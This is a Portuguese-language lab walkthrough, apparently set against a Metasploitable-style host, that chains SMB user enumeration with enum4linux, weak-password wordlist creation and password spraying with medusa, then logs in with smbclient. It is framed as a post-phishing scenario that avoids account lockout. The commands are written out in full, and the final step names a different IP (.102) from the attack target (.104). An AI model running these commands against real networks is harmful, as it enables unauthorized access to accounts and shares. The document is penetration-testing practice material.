# Ataque em cadeia, enumeracao smb password spraying
 
 ## Conceitos utilizados durante esse teste 
SMB é um protocolo da Microsoft usado para compartilhar arquivos, pastas e impressoras dentro de redes internas.

Password spraying é um ataque que testa uma senha comum em vários usuários para encontrar acessos válidos sem bloquear contas.

## Cenário hipotético
 Você conseguiu acesso a uma rede interna realizando phishing e descobriu um servidor smb ativo, o nosso proximo passo após descobrir o smb ativo, é descobrir as contas existentes no sistema e testar senhas fracas, discretamente sem bloquear nenhuma conta.


## Primeira etapa: Enumeração de usuários com Enum4linux

Dentro do terminal irá realizar o seguinte processo:

- enum4linux -a 192.168.56.104 | tee enum4_output.txt

(Esse comando irá enumerar os usuarios e salvar no arquivo enum4_output.txt)


![Python](/imagens/img1.png)

- less enum4_output.txt

(abrir o comando que acabamos de rodar)

![Python](/imagens/users_localizados_com_esse_script_img2.png)


## Segunda etapa:  Criar wordlst de usuários: 

- $ echo -e "user\nmsfadmin\nservice" > smb_users.txt

(o arquivo criado "smb.user" irá alimentar a nossa ferramenta de ataque)

E para criar a senhas iremos utilizar o seguinte script:

- echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

![Python](/imagens/criar_wordlist_senhas_img3.png)

## Terceira etapa: Realizar o ataque utilizando o script:

- medusa -h 192.168.56.104 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

(Tenta autenticar (password-spray/brute-force) no serviço SMB do host 192.168.56.104 usando listas de usuários (smb_users.txt) e senhas (senhas_spray.txt), com paralelismo controlado.)

![Python](/imagens/utilizando_medusa_img4.png)

Se o ataque funcionar irá identificar os logins no retorno ACCOUNT FOUND:

![Python](/imagens/retorno_img5.png)

Para conectar ao Smb e comprovar que o ataque funcionou, utilize o script:

smbclient -L //192.168.56.102 -U msfadmin

E após isso digite a senha.

![Python](/imagens/teste_concluido_img6.png)